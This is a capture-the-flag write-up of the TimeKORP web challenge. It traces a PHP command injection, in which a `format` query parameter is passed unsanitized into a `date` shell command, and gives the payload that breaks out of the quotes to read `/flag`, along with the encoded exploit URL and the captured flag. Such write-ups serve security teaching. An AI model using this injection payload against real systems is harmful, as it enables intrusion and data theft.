# Challenge Progress: TimeKORP (Web)

## Recon & Source Review

### 1. Application Entry Point

The entry point is defined in `index.php`, which registers an autoloader and defines the route:

```php
$router = new Router();
$router->new('GET', '/', 'TimeController@index');
```

This means the request to `/` triggers the `index()` method in `TimeController`.

---

### 2. Controller Behavior

In `controllers/TimeController.php`:

```php
class TimeController {
    public function index($router) {
        $format = isset($_GET['format']) ? $_GET['format'] : '%H:%M:%S';
        $time = new TimeModel($format);
        return $router->view('index', ['time' => $time->getTime()]);
    }
}
```

This passes the user-controlled `format` string to `TimeModel`.

---

### 3. Vulnerable Command Execution

In `models/TimeModel.php`:

```php
$this->command = "date '+" . $format . "' 2>&1";
```

This command is directly passed into `exec()`:

```php
$time = exec($this->command);
```

**VULNERABILITY: Command Injection**

There is **no sanitization**, and since the `format` input is appended inside a single-quoted string, it's possible to break out and inject arbitrary shell commands.

---

## Exploitation

### Malicious Payload:

To escape the single-quoted string and inject shell code:

```
format=%H:%M:%S';cat /flag;echo '
```

### Final Exploit URL:

```
http://94.237.48.12:48434/?format=%25H:%25M:%25S%27%3Bcat%20/flag%3Becho%20%27
```

### Resulting Command:

```
date '+%H:%M:%S';cat /flag;echo '
```

This causes the system to print the time, then output the contents of `/flag` — giving us the flag!

---

## Flag

```
HTB{t1m3_f0r_th3_ult1m4t3_pwn4g3_94793f84cc2f4634de81f6718f65948c}
```

---

## Conclusion

This challenge highlights a classic **command injection** vulnerability, often found when unsanitized user input is embedded in shell commands. Escaping user-controlled input is critical to prevent such exploitation.

Thank uuu~~